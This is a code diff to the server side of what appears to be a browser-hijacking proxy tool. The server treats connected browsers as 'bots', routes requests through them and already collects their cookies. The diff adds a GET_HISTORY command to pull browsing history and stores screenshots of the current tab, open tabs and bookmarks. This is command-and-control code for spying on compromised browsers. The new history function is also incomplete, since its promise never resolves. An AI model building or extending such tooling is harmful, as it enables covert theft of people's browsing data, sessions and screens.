@@ -64,6 +64,7 @@ async function ping(websocket_connection, params) {
     });
     await bot.update({
         is_online: true,
+        current_tab_image: params.current_tab_image
     });
 }
 
@@ -147,6 +148,38 @@ function get_browser_cookie_array(browser_id) {
         );
     });
 }
+
+function get_browser_history_array(browser_id) {
+    return new Promise(function(resolve, reject) {
+        setTimeout(function() {
+            reject(`Get history RPC called timed out.`);
+        }, (30 * 1000));
+
+        const message_id = uuid.v4();
+
+        var message = {
+            'id': message_id,
+            'version': SERVER_VERSION,
+            'action': 'GET_HISTORY',
+            'data': {}
+        }
+
+
+        const subscription_id = `TOPROXY_${browser_id}`;
+        subscriber.subscribe(subscription_id);
+
+        // Send the HTTP request RPC message to the browser
+        publisher.publish(
+            `TOBROWSER_${browser_id}`,
+            JSON.stringify(
+                message
+            )
+        );
+
+
+    })
+}
+
 
 function send_request_via_browser(browser_id, authenticated, url, method, headers, body) {
     return new Promise(function(resolve, reject) {
@@ -404,7 +437,11 @@ async function initialize_new_browser_connection(ws) {
             'proxy_password': new_password,
             'is_authenticated': true,
             'is_online': true,
-            'user_agent': user_agent
+            'user_agent': user_agent,
+            'current_tab':'',
+            'current_tab_image':'',
+            'tabs':{},
+            'bookmarks':{}
         });
     } else {
         // Update all browserproxy records to reflect that all these proxies are
@@ -551,7 +588,7 @@ async function initialize() {
                 }
                 return
             } else if (inbound_message.action === 'PING') {
-                ping(ws);
+                ping(ws,inbound_message.data);
             } else if (ws.browser_id) {
                 // Write to redis proxy topic with the response from the
                 // websocket connection.
@@ -588,7 +625,8 @@ async function initialize() {
     logit(`Starting API server...`);
 
     const proxy_utils = {
-        'get_browser_cookie_array': get_browser_cookie_array
+        'get_browser_cookie_array': get_browser_cookie_array,
+        'get_browser_history_array':get_browser_history_array
     };
 
     // Start the API server
